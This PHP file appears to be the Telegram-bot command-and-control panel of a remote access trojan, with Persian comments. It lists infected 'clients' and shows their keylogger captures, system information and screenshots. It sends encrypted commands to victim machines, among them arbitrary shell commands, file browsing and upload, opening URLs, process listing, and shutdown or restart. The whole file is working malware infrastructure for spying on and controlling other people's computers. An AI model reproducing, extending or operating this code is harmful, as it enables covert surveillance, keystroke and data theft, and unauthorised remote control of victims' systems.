<?php
require_once 'config.php';
require_once 'utils.php';

class TelegramHandler
{
    public static function handle_telegram_update($pdo, $crypto, $update)
    {
        try {
            $chat_id = $update['message']['chat']['id'] ?? $update['callback_query']['from']['id'] ?? 0;

            if (!self::is_authorized($chat_id)) {
                self::send_telegram_message($chat_id, "Access denied. Only the authorized admin can use this bot.");
                self::log_update($update, "Unauthorized access attempt by chat_id: $chat_id");
                return;
            }

            if (isset($update['callback_query'])) {
                self::process_callback($pdo, $crypto, $update['callback_query']);
            } elseif (isset($update['message'])) {
                self::process_message($pdo, $crypto, $update['message']);
            }

            self::log_update($update, "Update processed successfully");
        } catch (Exception $e) {
            Utils::log_error("Error in handle_telegram_update: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred. Please check the logs.");
        }
    }

    private static function is_authorized($chat_id)
    {
        return $chat_id == Config::$ADMIN_CHAT_ID;
    }

    private static function process_message($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $text = $message['text'] ?? '';

            if (!empty($text)) {
                $stmt = $pdo->prepare("
                    INSERT INTO user_typelogs (chat_id, keystrokes, created_at)
                    VALUES (?, ?, NOW())
                ");
                $stmt->execute([$chat_id, $text]);
            }

            if (isset($message['document'])) {
                self::handle_file_upload($pdo, $crypto, $message);
                return;
            }

            switch ($text) {
                case '/start':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/cmd':
                    self::send_telegram_message($chat_id, "Please send the raw command.");
                    break;
                case '/screens':
                    self::show_screenshots($pdo, $chat_id);
                    break;
                case '/logs':
                    self::show_logs($chat_id);
                    break;
                case '/browse':
                    self::send_command($pdo, $crypto, $chat_id, 'file_operation', ['action' => 'list']);
                    break;
                case '/get-info':
                    self::send_command($pdo, $crypto, $chat_id, 'system_info', []);
                    break;
                case '/go':
                    self::send_telegram_message($chat_id, "Please send the URL to open.");
                    break;
                case '/users':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/shutdown':
                case '/restart':
                case '/sleep':
                case '/signout':
                    self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => substr($text, 1)]);
                    break;
                case '/startup':
                case '/tasks':
                    self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                    break;
                default:
                    if (strpos($text, '/cmd ') === 0) {
                        self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => substr($text, 5)]);
                    } elseif (strpos($text, '/go ') === 0) {
                        self::send_command($pdo, $crypto, $chat_id, 'open_url', ['url' => substr($text, 4)]);
                    } else {
                        self::send_telegram_message($chat_id, "Unknown command. Use /start to begin.");
                    }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_message: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while processing the message.");
        }
    }

    private static function process_callback($pdo, $crypto, $callback)
    {
        try {
            $chat_id = $callback['from']['id'];
            $data = $callback['data'];

            if (strpos($data, 'select_client:') === 0) {
                $client_id = substr($data, 14); // Extract client_id after 'select_client:'
                $stmt = $pdo->prepare("UPDATE allowed_users SET selected_client_id = ? WHERE chat_id = ?");
                $stmt->execute([$client_id, $chat_id]);
                self::show_access_menu($pdo, $chat_id, $client_id);
            } elseif (strpos($data, 'action:') === 0) {
                list($prefix, $action, $client_id) = explode(':', $data, 3);
                if ($prefix === 'action') {
                    if ($action === 'get_info') {
                        self::send_command($pdo, $crypto, $chat_id, 'system_info', ['client_id' => $client_id]);
                    } elseif ($action === 'browse') {
                        self::send_command($pdo, $crypto, $chat_id, 'file_operation', ['action' => 'list', 'client_id' => $client_id]);
                    } elseif ($action === 'shutdown') {
                        self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => 'shutdown', 'client_id' => $client_id]);
                    } elseif ($action === 'restart') {
                        self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => 'restart', 'client_id' => $client_id]);
                    } elseif (strpos($data, 'view_old_data:') === 0) {
                        $client_id = substr($data, 14);
                        self::show_old_data($pdo, $chat_id, $client_id);
                    }
                }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_callback: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while processing the callback.");
        }
    }

    private static function show_client_list($pdo, $chat_id) {
        try {
            $stmt = $pdo->prepare("SELECT client_id, last_seen FROM users");
            $stmt->execute();
            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$clients) {
                self::send_telegram_message($chat_id, "هیچ کاربری پیدا نشد.");
                return;
            }

            $keyboard = ['inline_keyboard' => []];
            $now = time(); // زمان فعلی

            foreach ($clients as $client) {
                $last_seen_time = strtotime($client['last_seen']);
                $is_online = ($now - $last_seen_time) <= Config::$ONLINE_THRESHOLD;
                $status = $is_online ? 'آنلاین' : 'آفلاین';
                $text = $client['client_id'] . " ($status)";

                if ($is_online) {
                    // کاربر آنلاینه، می‌تونیم انتخابش کنیم
                    $keyboard['inline_keyboard'][] = [[
                        'text' => $text,
                        'callback_data' => 'select_client:' . $client['client_id']
                    ]];
                } else {
                    // کاربر آفلاینه، فقط اطلاعات قدیمی رو نشون می‌دیم
                    $keyboard['inline_keyboard'][] = [[
                        'text' => $text,
                        'callback_data' => 'view_old_data:' . $client['client_id']
                    ]];
                }
            }

            self::send_telegram_message($chat_id, "یه کاربر انتخاب کن:", ['reply_markup' => $keyboard]);
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "خطا در گرفتن لیست کاربران.");
        }
    }

    private static function show_old_data($pdo, $chat_id, $client_id) {
        try {
            $stmt = $pdo->prepare("
                SELECT * FROM client_data 
                WHERE client_id = ? 
                ORDER BY received_at DESC 
                LIMIT 1
            ");
            $stmt->execute([$client_id]);
            $data = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($data) {
                $message = "اطلاعات قدیمی کاربر $client_id:\n";
                $message .= "کی‌لاگر: " . ($data['keystrokes'] ?? 'نداره') . "\n";
                $message .= "اطلاعات سیستم: " . json_encode($data['system_info'] ?? [], JSON_PRETTY_PRINT) . "\n";
                $message .= "زمان دریافت: " . $data['received_at'] . "\n";
                self::send_telegram_message($chat_id, $message);
            } else {
                self::send_telegram_message($chat_id, "هیچ اطلاعاتی برای $client_id پیدا نشد.");
            }
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "خطا در نمایش اطلاعات قدیمی.");
        }
    }

    private static function show_access_menu($pdo, $chat_id, $client_id)
    {
        try {
            $keyboard = ['inline_keyboard' => [
                [['text' => 'Get Info', 'callback_data' => 'action:get_info:' . $client_id]],
                [['text' => 'Browse Files', 'callback_data' => 'action:browse:' . $client_id]],
                [['text' => 'Shutdown', 'callback_data' => 'action:shutdown:' . $client_id]],
                [['text' => 'Restart', 'callback_data' => 'action:restart:' . $client_id]],
            ]];

            self::send_telegram_message($chat_id, "Access menu for client $client_id:", ['reply_markup' => $keyboard]);
        } catch (Exception $e) {
            Utils::log_error("Error in show_access_menu: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while showing the access menu.");
        }
    }

    private static function show_screenshots($pdo, $chat_id)
    {
        try {
            $stmt = $pdo->prepare("SELECT screenshot_path FROM client_data WHERE screenshot_path IS NOT NULL ORDER BY received_at DESC LIMIT 5");
            $stmt->execute();
            $screenshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$screenshots) {
                self::send_telegram_message($chat_id, "No screenshots found.");
                return;
            }

            foreach ($screenshots as $screenshot) {
                if (file_exists($screenshot['screenshot_path'])) {
                    self::send_telegram_message($chat_id, null, ['photo' => curl_file_create($screenshot['screenshot_path'])]);
                } else {
                    Utils::log_error("Screenshot file not found: " . $screenshot['screenshot_path']);
                }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_screenshots: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching screenshots.");
        }
    }

    private static function show_logs($chat_id)
    {
        try {
            if (file_exists(Config::$ERROR_LOG)) {
                $logs = file_get_contents(Config::$ERROR_LOG);
                self::send_telegram_message($chat_id, "Error logs:\n" . htmlspecialchars($logs));
            } else {
                self::send_telegram_message($chat_id, "No logs found.");
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_logs: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching logs.");
        }
    }

    private static function send_command($pdo, $crypto, $chat_id, $type, $params) {
        try {
            $client_id = $params['client_id'] ?? null;
            if (!$client_id) {
                $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
                $stmt->execute([$chat_id]);
                $client_id = $stmt->fetchColumn();
                if (!$client_id) {
                    self::send_telegram_message($chat_id, "No client selected. Please select a client first using /start.");
                    return;
                }
            }
            $client_id = Utils::sanitize_input($client_id);
            $command = ['type' => $type, 'params' => $params];
    
            $stmt = $pdo->prepare("
                INSERT INTO commands (client_id, command, status, created_at)
                VALUES (?, ?, 'pending', NOW())
            ");
            $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);
    
            self::send_telegram_message($chat_id, "Command sent to client $client_id.");
        } catch (Exception $e) {
            Utils::log_error("Error in send_command: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while sending the command.");
        }
    }

    private static function handle_file_upload($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $file_id = $message['document']['file_id'];
            $file = self::get_telegram_file($file_id);

            $file_path = Config::$UPLOAD_DIR . $message['document']['file_name'];
            file_put_contents($file_path, $file);

            self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
                'action' => 'upload',
                'path' => $file_path
            ]);
        } catch (Exception $e) {
            Utils::log_error("Error in handle_file_upload: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while uploading the file.");
        }
    }

    private static function get_telegram_file($file_id)
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getFile?file_id=$file_id";
            $response = json_decode(file_get_contents($url), true);
            if (!$response['ok']) {
                throw new Exception("Failed to get Telegram file: " . $response['description']);
            }
            $file_path = $response['result']['file_path'];
            $file_content = file_get_contents("https://api.telegram.org/file/bot" . Config::$BOT_TOKEN . "/$file_path");
            if ($file_content === false) {
                throw new Exception("Failed to download Telegram file.");
            }
            return $file_content;
        } catch (Exception $e) {
            Utils::log_error("Error in get_telegram_file: " . $e->getMessage());
            throw $e;
        }
    }

    public static function send_telegram_message($chat_id, $text, $options = [])
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/" . (isset($options['photo']) ? 'sendPhoto' : 'sendMessage');
            $data = [
                'chat_id' => $chat_id,
                'text' => $text,
                'parse_mode' => 'HTML'
            ];

            if (isset($options['reply_markup'])) {
                $data['reply_markup'] = json_encode($options['reply_markup']);
            }

            if (isset($options['photo'])) {
                $data['photo'] = $options['photo'];
            }

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => Config::$COMMAND_TIMEOUT
            ]);
            $response = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
            Utils::log_error("Error in send_telegram_message: " . $e->getMessage());
        }
    }

    private static function log_update($update, $message = '')
    {
        $log_entry = [
            'time' => date('Y-m-d H:i:s'),
            'message' => $message,
            'update' => $update
        ];
        file_put_contents(Config::$TELEGRAM_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
